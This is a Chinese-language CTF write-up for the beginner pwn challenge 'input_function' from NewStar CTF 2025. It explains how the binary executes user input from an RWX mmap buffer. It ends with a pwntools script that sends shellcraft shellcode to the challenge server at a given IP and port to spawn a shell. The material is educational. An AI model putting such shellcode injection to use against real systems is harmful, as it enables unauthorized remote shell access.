---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# input_function

<Container type='info'>

本题考查无限制 shellcode 的注入。
</Container>

用 IDA 打开这个程序，点击 <kbd>F5</kbd>，我们就可以看到程序的反编译，如下图：

![main 函数内容](/assets/images/wp/2025/week1/input_function_1.png)

由于一般程序是从 `main` 函数开始提供服务的，所以我们重点分析 `main` 函数

在左侧 `function name` 表中双击 `main` 这个函数名：

![逻辑分析](/assets/images/wp/2025/week1/input_function_2.jpg)

可以看到，程序先通过 `mmap` 开辟了一个 `0x1000`<span data-desc>（一个页表）</span>bytes 的内存空间，并设置为了可读可写可执行<span data-desc>（函数参数中的 7 的二进制表示为 111，从低位到高位分别表示可读可写可执行）</span>，随后将这个空间的地址存入 `buf` 变量中。之后程序先输出了一个字符串，随后通过 `read` 函数读取用户输入，将输入写入 `buf` 变量内。随后进行了一个调用操作。

运行程序，尝试随便输入些内容：

![报错信息](/assets/images/wp/2025/week1/input_function_3.png)

会发现程序报错，这是由图中红色框选的部分 `buf()` 错误引发的。`((void (*)(void))buf)();`这个语句是指，将 `buf` 强制转换成一个函数指针，这样直接调用函数就相当于把 `buf` 指向的内存空间的内容作为函数内容<span data-desc>（字节码）</span>来执行。因此我们需要输入一个合法可执行的字节码，这叫做 **shellcode 注入**。

这一题是初级 shellcode，我们输入的内容会被解析成函数并执行，因此我们要写汇编代码，并通过 `asm()` 函数等方式汇编成机器码，并将机器码输入交互程序中。

由于可输入的字符数很多，因此可以使用 Python 脚本和 `pwntools` 库直接生成。

```python
from pwn import *
context(os="linux", arch="amd64", log_level="debug")

io = remote("8.147.132.32", 12380)
# io = process("./pwn")

shell = shellcraft.sh()
shell = asm(shell)
io.send(shell)

io.interactive()
```

关于手写 shellcode，具体可以阅读[这篇文章](https://www.cnblogs.com/ZIKH26/articles/15845766.html)。
